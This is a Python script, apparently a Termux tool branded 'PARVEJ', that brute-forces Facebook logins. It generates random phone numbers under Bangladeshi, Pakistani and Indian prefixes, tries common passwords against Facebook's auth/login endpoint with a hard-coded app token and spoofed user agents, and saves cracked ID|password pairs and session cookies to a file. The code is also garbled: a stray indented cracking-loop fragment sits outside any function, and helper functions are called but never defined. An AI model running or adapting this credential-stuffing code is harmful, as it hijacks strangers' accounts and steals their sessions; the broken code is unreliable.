import os
print("\033[1;92m [•] PARVEJ  (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
os.system("pkg install espeak")
print("\033[1;92m   [•] ROBOT INSTALL COMPLETE \033[1;30m")
os.system('espeak -a 300 "Robot install complete"')
print("\033[1;92m   [•] UPDATE CHECKING \033[1;30m")
os.system('espeak -a 300 "WAITING FOR UPDATE"')
os.system("git pull")
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
    os.system('git pull')
    os.system('pkg install curl')
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup

ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
R = '\033[31;1m'
G = '\033[32;1m'
Y = '\033[33;1m'
B = '\033[34;1m'
M = '\033[35;1m'
C = '\033[36;1m'
LR = '\033[91;1m'
LG = '\033[92;1m'
LY = '\033[93;1m'
LB = '\033[94;1m'
LM = '\033[95;1m'
LC = '\033[96;1m'
dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

ua = ["Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; Xiaomi MI 4(MI 4W) Build/KTU84P) AppleWebKit/534.24 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.24 T5/2.0 baidubrowser/5.6.3.0 (Baidu; P1 4.4.4)",]
ua = ["Mozilla/5.0 (Linux; U; Android 13; en-gb; Xiaomi 13 Ultra Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.37.1-gn",]
ua = ["Mozilla/5.0 (Linux; U; Android 13; fr-fr; TECNO CK6 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36 PHX/13.6",]
ua = ["Mozilla/5.0 (Linux; U; Android 13; es-es; Redmi Pad Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.25.2.2-gn",]
ua = ["Mozilla/5.0 (Linux; Android 12; Armor X10 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; 2209116AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36 OPR/68.3.3557.65821",]
ua = ["Mozilla/5.0 (Linux; Android 13; TECNO CK9n Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/361.0.0.12.5;]",]
ugen=[]
for x in range(100):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def PARVEJ_programmer():
    os.system('clear')
    print(logo)
    os.system('espeak -a 300 "Walcome To BANGLADESH  PARVEJ CYBER King off PARVEJ WOULD"')
    os.system('speak -a 300 "FREE FIRE. PUBGI. TIKTOK. ACCOUNT. Hack. Tools"')
    print("")
    print('\033[38;5;46m   [01] GAME IDZ CLONING')
    print('\033[38;5;46m   [02] CONTACT ME FACEBOOK')
    print('\033[38;5;46m   [03] PYTHON CLASS CHANNEL')
    NAHID = input('\n\x1b[1;32m   CHOOSE : ')
    if NAHID == '1':
    	os.system('espeak -a 300 "random cloning start"')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100086442349803')
    time.sleep(5)
    nahid_afridy()
    if NAHID == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100081753736308&mibextid=ZbWKwL')
        nahid_afridy()
    if NAHID == '3':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100081753736308&mibextid=ZbWKwL')
        nahid_afridy()
    if NAHID == '0': 
        os.system('exit')
        return None

logo = ("""
 d8888b.  .d8b.  d8888b. db    db d88888b    d88b 
88  `8D d8' `8b 88  `8D 88    88 88'        `8P' 
88oodD' 88ooo88 88oobY' Y8    8P 88ooooo     88  
88~~~   88~~~88 88`8b   `8b  d8' 88~~~~~     88  
88      88   88 88 `88.  `8bd8'  88.     db. 88  
88      YP   YP 88   YD    YP    Y88888P Y8888P  

 \033[1;91m\033[1;41m\033[1;97m              WELCOME TO PARVEJ TOOLS               \033[;0m\033[1;91m\033[1;92m           

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PAID
\033[1;32m[-] AUTHOR    :\033[1;32m PARVEJ HOSSEN
\033[1;32m[-] GITHUB    :\033[1;32m ROMAN-XXX
\033[1;32m[-] FACEBOOK  :\033[1;32m FH Roman
\033[1;92m══════════════════════════════════════════

\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS PARVEJ BRAND\033[;0m\033[1;91m═══>\033[1;92m""")

try:
    print('\n\n\033[38;5;46mCRACKING UPDATE DONE\033[38;5;46m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[38;5;46m   No internet connection\033[38;5;46m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
# APK CHECK
def nahid_afridy():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('')
    print('\033[38;5;46m   PAK CODE   - \033[1;35m92301 \033[1;35m92302 \033[1;35m92303 \033[1;35m92305')
    os.system('espeak -a 300 "Choice pak code"')
    print('\033[38;5;46m   INDIA CODE - \033[1;34m91778 \033[1;34m91930 \033[1;34m91902 \033[1;34m91712')
    os.system('espeak -a 300 "choice indian code"')
    print('\033[38;5;46m   BD CODE    - \033[1;32m016 \033[1;32m017 \033[1;32m013 \033[1;32m018 \033[1;32m019 \033[1;32m014 \033[1;32m015')
    os.system('espeak -a 300 "choice bangladesh code"')
    print('')
    code = input('\033[38;5;46m   CHOOSE YOUR COUNTRY CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;93m   EXAMPLE : \033[1;92m2000, 5000, 10000, 50000\n\n\033[1;92m   CHOOSE CLONING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:
        os.system("clear")
        print(logo)
        tl = str(len(user))
        print('\033[38;5;46m   CHOOSE YOUR CODE : \033[1;92m' +code)
        os.system('espeak -a 300 "Your choice code"' +code)
        print('\033[38;5;46m   TOTAL IDS : \033[1;92m'+tl)
        os.system('espeak -a 300 "total  id limit"'+tl)
        print('\033[38;5;46m   TO STOP PROCESS Ctrl + Z')
        os.system('espeak -a 300 "clone stop to press cntrol z"')
        print('\033[38;5;46m   WILL RUN ON ANY NETWORK')
        jalan('  PARVEJ ●⃝ᶫᵒꪜe💗ᴳᶹʳᶹ᭄ WAIT A 5 MINUTES PARVEJ ●⃝ᶫᵒꪜe💗ᴳᶹʳᶹ᭄')
        os.system('espeak -a 300 "Wait for 5 minutes"')
        print('')
        for love in user:
            pwx = [love, 'bangladesh', 'i love you']
            uid = code+love
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[38;5;46m[\033[38;5;46m✔︎\033[38;5;46m]\033[38;5;46mCRACK PROCESS HAS BEEN COMPLETED ')
    os.system('espeak -a 300 "PROCESS HAS BEEN COMPLETED"')
    print('\033[38;5;46m[\033[38;5;46m✔︎\033[38;5;46m]\033[38;5;46mIDS SAVED IN PARVEJ.txt')
 
import os, uuid, random
import requests as r

def login():
    os.system("clear")
    print("\033[1;37m")
    uid = "kode+kodex+kod+guru"
    pww = "kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234"
    ua = "[FBAN/Orca-Android;FBAV/5.0.0.16.1;FBLC/tr_TR;FBBV/2302400;FBCR/ T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/GT-I9300;FBSV/4.0.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1066,height=552};]"
    check(uid, pww, ua)

def check(uid, pww, ua):
    try:
        data = {
            "adid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "email": uid,
            "password": pww,
            "cpl": "true",
            "source": "device_based_login",
            "format": "json",
            "generate_session_cookies": "1",
            "generate_analytic_claims": "1",
            "generate_machine_id": "1",
            "locale": "GB",
            "country_code": "GB",
            "client_country_code": "GB",
            "currently_logged_in_userid": "0",
        }
        headers = {
            "User-Agent": ua,
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-Connection-Quality": "EXCELLENT",
            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
            "X-FB-HTTP-Engine": "Liger",
        }
        url = "https://b-graph.facebook.com/auth/login"
        result = r.post(url, data=data, headers=headers).json()
        print(result)
    except:
        pass

login()
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[38;5;46m[🦋⃟ᎶꫝᴍᴇᏒ✮⃝PARVEJ𝄟⃝] '+cid+' | '+ps+' \n\033[38;5;46mCOOKIES : \033[1;32m'+coki+   '  ')
                os.system('espeak -a 300 "Congratulations. ok id"')
                cek_apk(session,coki)
                open('/sdcard/\033[38;5;46m🦋⃟ᎶꫝᴍᴇᏒ✮⃝PARVEJ𝄟⃝-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['EMRAN CYBER','EMRAN-CYBER ','EMRAN CRACK '])
        colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        emoji=random.choice(['😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','🦶','🙆','🌺','🌸','🏵️','🍁','🌼','??','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🍑','🍊','🥭','🍍','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','🥐','🧀','🍤','🇧🇩','☠️'])
        colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r \33[1;90m[{colr}🦋⃟ᎶꫝᴍᴇᏒ✮⃝PARVEJ𝄟⃝\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
    except:
        pass
PARVEJ_programmer()


